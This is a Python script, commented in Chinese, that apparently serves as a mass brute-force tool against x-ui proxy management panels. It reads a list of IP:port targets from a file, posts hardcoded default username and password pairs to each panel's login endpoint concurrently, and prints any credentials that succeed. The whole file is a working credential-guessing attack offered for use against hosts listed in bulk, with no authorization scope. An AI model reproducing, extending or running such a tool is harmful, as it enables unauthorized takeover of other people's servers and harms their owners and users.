import requests
import json
from typing import List, Tuple, Dict, Any
import time
import os
from datetime import datetime
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor

# 测试用的用户名和密码列表
USERNAME_LIST = ['admin', 'root', 'abc123', 'user', 'username']
PASSWORD_LIST = ['admin', '123456', 'abc123+', 'user','password', 'admin123','123456','root123',]


def format_url(ip_port: str) -> str:
    """
    将IP:端口格式转换为完整的URL
    """
    return f"http://{ip_port}"


def read_urls_from_file(filename: str) -> List[str]:
    """
    从文件中读取x-ui服务器地址并去重
    参数:
        filename: 文件名
    返回: 服务器地址列表（已去重）
    """
    urls = []
    original_count = 0
    unique_ip_ports = set()  # 用于存储唯一的IP:端口组合
    
    try:
        # 获取当前目录
        current_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_dir, filename)

        if not os.path.exists(file_path):
            print(f"❌ 错误: 文件 {file_path} 不存在！")
            return urls

        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

            for line in lines:
                line = line.strip()
                if not line:  # 跳过空行
                    continue
                
                original_count += 1  # 计数原始行数
                
                ip = None
                port = None
                
                # 检查格式是否为 IP:端口
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        ip, port = parts
                # 检查格式是否为 IP 端口
                elif ' ' in line:
                    parts = line.split()
                    if len(parts) == 2:
                        ip, port = parts
                # 检查格式是否为 IP,端口
                elif ',' in line:
                    parts = line.split(',')
                    if len(parts) == 2:
                        ip, port = parts
                
                # 验证端口是否有效
                if ip and port and port.isdigit() and 1 <= int(port) <= 65535:
                    # 标准化 IP:端口 格式用于去重
                    ip_port = f"{ip.strip()}:{port.strip()}"
                    
                    # 去重逻辑
                    if ip_port not in unique_ip_ports:
                        unique_ip_ports.add(ip_port)
                        url = format_url(ip_port)
                        urls.append(url)
                else:
                    print(f"⚠️ 警告: 行 '{line}' 格式不正确，应为 IP:端口 或 IP 端口 或 IP,端口")

        # 报告去重结果
        duplicate_count = original_count - len(unique_ip_ports)
        if duplicate_count > 0:
            print(f"🔄 检测到 {duplicate_count} 个重复的IP:端口，已自动去重")
            
        if urls:
            print(f"✅ 成功读取 {len(urls)} 个唯一服务器地址")
        else:
            print("❌ 未找到有效的服务器地址")

    except Exception as e:
        print(f"❌ 读取文件时出错: {str(e)}")

    return urls


async def async_login(session, base_url: str, username: str, password: str) -> Tuple[bool, str]:
    """
    异步测试x-ui登录功能
    参数:
        session: aiohttp客户端会话
        base_url: 基础URL
        username: 用户名
        password: 密码
    返回: (bool, str) - (是否成功, 消息)
    """
    try:
        login_url = f"{base_url}/login"
        login_data = {
            "username": username,
            "password": password
        }

        async with session.post(
            login_url,
            json=login_data,
            headers={'Content-Type': 'application/json'}
        ) as response:
            # 检查响应内容
            try:
                response_data = await response.json()
                if response.status == 200 and response_data.get('success', False):
                    return True, "登录成功"
                else:
                    return False, f"登录失败: {response_data.get('msg', '未知错误')}"
            except json.JSONDecodeError:
                return False, "登录失败: 响应格式错误"

    except Exception as e:
        return False, f"发生错误: {str(e)}"


class XUITester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def login(self, username: str, password: str) -> Tuple[bool, str]:
        """
        测试x-ui登录功能
        参数:
            username: 用户名
            password: 密码
        返回: (bool, str) - (是否成功, 消息)
        """
        try:
            login_url = f"{self.base_url}/login"
            login_data = {
                "username": username,
                "password": password
            }

            response = self.session.post(
                login_url,
                json=login_data,
                headers={'Content-Type': 'application/json'}
            )

            # 检查响应内容
            try:
                response_data = response.json()
                if response.status_code == 200 and response_data.get('success', False):
                    return True, "登录成功"
                else:
                    return False, f"登录失败: {response_data.get('msg', '未知错误')}"
            except json.JSONDecodeError:
                return False, "登录失败: 响应格式错误"

        except Exception as e:
            return False, f"发生错误: {str(e)}"

    async def async_batch_test(self, usernames: List[str], passwords: List[str], max_concurrent: int = 10) -> List[dict]:
        """
        异步批量测试登录
        参数:
            usernames: 用户名列表
            passwords: 密码列表
            max_concurrent: 最大并发请求数
        返回: 测试结果列表
        """
        results = []
        total_combinations = len(usernames) * len(passwords)
        tested = 0
        
        print(f"\n🚀 开始测试服务器: {self.base_url}")
        print(f"📊 开始批量测试，共 {total_combinations} 种组合...")
        
        # 创建信号量限制并发请求数
        semaphore = asyncio.Semaphore(max_concurrent)
        
        # 进度显示锁
        progress_lock = asyncio.Lock()
        
        async def test_combination(username, password):
            nonlocal tested
            
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    success, message = await async_login(session, self.base_url, username, password)
                    
                    async with progress_lock:
                        nonlocal tested
                        tested += 1
                        print(f"\r⏳ 测试进度: {tested}/{total_combinations} ({(tested / total_combinations * 100):.1f}%)",
                              end="")
                    
                    if success:
                        result = {
                            "username": username,
                            "password": password,
                            "success": success,
                            "message": message,
                            "url": self.base_url,
                            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        return result
            return None
        
        # 创建所有测试任务
        tasks = []
        for username in usernames:
            for password in passwords:
                tasks.append(test_combination(username, password))
        
        # 执行所有任务并等待第一个成功的结果
        for future in asyncio.as_completed(tasks):
            result = await future
            if result:
                print("\n✨ 找到正确的用户名和密码组合！")
                print("=" * 50)
                print(f"🌐 服务器: {result['url']}")
                print(f"👤 用户名: {result['username']}")
                print(f"🔑 密码: {result['password']}")
                print(f"⏰ 测试时间: {result['time']}")
                print("=" * 50)
                results.append(result)
                
                # 取消所有未完成的任务
                for task in tasks:
                    if not task.done():
                        task.cancel()
                
                return results
        
        print("\n❌ 测试完成！未找到正确的用户名和密码组合。")
        return results

    def batch_test(self, usernames: List[str], passwords: List[str], delay: float = 0.5) -> List[dict]:
        results = []
        total_combinations = len(usernames) * len(passwords)
        current = 0

        print(f"\n🚀 开始测试服务器: {self.base_url}")
        print(f"📊 开始批量测试，共 {total_combinations} 种组合...")

        for username in usernames:
            for password in passwords:
                current += 1
                print(f"\r⏳ 测试进度: {current}/{total_combinations} ({(current / total_combinations * 100):.1f}%)",
                      end="")

                success, message = self.login(username, password)
                if success:
                    result = {
                        "username": username,
                        "password": password,
                        "success": success,
                        "message": message,
                        "url": self.base_url,
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    results.append(result)
                    print("\n✨ 找到正确的用户名和密码组合！")
                    print("=" * 50)
                    print(f"🌐 服务器: {result['url']}")
                    print(f"👤 用户名: {result['username']}")
                    print(f"🔑 密码: {result['password']}")
                    print(f"⏰ 测试时间: {result['time']}")
                    print("=" * 50)
                    return results

                time.sleep(delay)  # 添加延迟，避免请求过于频繁

        print("\n❌ 测试完成！未找到正确的用户名和密码组合。")
        return results


def print_banner():
    """
    打印程序启动横幅
    """
    banner = """
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                  ║
    ║  ██╗  ██╗██╗   ██╗██╗    ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗  ║
    ║  ╚██╗██╔╝██║   ██║██║   ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗ ║
    ║   ╚███╔╝ ██║   ██║██║   ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝ ║
    ║   ██╔██╗ ██║   ██║██║   ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗ ║
    ║  ██╔╝ ██╗╚██████╔╝██║   ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║ ║
    ║  ╚═╝  ╚═╝ ╚═════╝ ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ║
    ║                                                                                  ║
    ║  XUI CHECKER - 多线程登录测试工具                                                 ║
    ║  Author: YouTube                                                                 ║
    ║  Version: 1.1.0                                                                  ║
    ║                                                                                  ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)


async def async_main():
    """异步主函数"""
    try:
        print_banner()

        while True:
            print("\n📋 请选择测试模式：")
            print("1️⃣  从文件读取XUI")
            print("2️⃣  退出程序")

            choice = input("\n请输入选项（1-2）: ").strip()

            if choice == '1':
                # 从文件读取服务器地址
                filename = input("请输入文件名（例如：xui.txt）: ").strip()
                urls = read_urls_from_file(filename)

                if not urls:
                    print("\n💡 提示：请确保文件格式正确，每行一个地址，格式为 IP:端口 或 IP 端口 或 IP,端口")
                    print("📝 示例：")
                    print("219.153.133.149:54321")
                    print("219.153.133.149 54321")
                    print("219.153.133.149,54321")
                    continue

                results = []
                for url in urls:
                    tester = XUITester(url)
                    result = await tester.async_batch_test(USERNAME_LIST, PASSWORD_LIST)
                    if result:
                        results.extend(result)

            elif choice == '2':
                print("\n👋 感谢使用，程序已退出")
                break

            else:
                print("❌ 无效的选项，请重新选择！")
                continue
    except Exception as e:
        print(f"\n❌ 程序发生错误: {str(e)}")
        import traceback
        traceback.print_exc()


def main():
    try:
        # 使用asyncio运行异步主函数
        asyncio.run(async_main())
    except Exception as e:
        print(f"\n❌ 程序发生错误: {str(e)}")
        import traceback
        traceback.print_exc()
    finally:
        # 程序结束前暂停，让用户有时间查看输出
        print("\n按回车键退出...")
        input()


if __name__ == "__main__":
    main()
